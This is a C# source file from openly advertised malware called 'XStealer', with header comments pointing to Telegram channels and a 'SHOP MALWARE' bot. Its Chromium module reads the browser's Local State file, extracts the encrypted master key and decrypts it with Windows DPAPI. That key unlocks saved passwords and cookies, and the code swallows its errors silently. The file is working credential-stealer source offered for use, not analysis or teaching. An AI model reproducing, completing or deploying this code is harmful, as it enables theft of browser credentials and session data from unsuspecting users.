// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class CBox
    {
        private static string BrowserPath = string.Empty;

        private static byte[] MasterKeyBuffer = new byte[] { 0 };

        public static byte[] GetMasterKey(string StateDir)
        {
            string sLocalStateFile = StateDir; sLocalStateFile += sLocalStateFile.Contains("Opera") ? @"\Opera Stable\Local State" : @"\Local State";
            if (File.Exists(sLocalStateFile))
            {
                if (sLocalStateFile != BrowserPath) { BrowserPath = sLocalStateFile; } else return MasterKeyBuffer;

                try
                {
                    string ReadFile = File.ReadAllText(sLocalStateFile) ?? InternalReadAllText(sLocalStateFile, Encoding.UTF8);
                    MatchCollection pattern = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(ReadFile);
                    var bMasterKey = new byte[] { 0 };
                    foreach (Match prof in pattern)
                    {
                        if (prof.Success)
                        {
                            bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
                        }
                    }

                    var bRawMasterKey = new byte[bMasterKey.Length - 5];
                    Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);
                    MasterKeyBuffer = ConverterEx.TrimEnd(ProtectedData.Unprotect(bRawMasterKey, null, DataProtectionScope.CurrentUser));
                }
                catch { }
            }

            return MasterKeyBuffer ?? null;
        }

        private static string InternalReadAllText(string path, Encoding encoding)
        {
            string result = string.Empty;
            try
            {
                using var streamReader = new StreamReader(path, encoding, true);
                result = streamReader.ReadToEnd();
            }
            catch { }
            return result;
        }
    }
}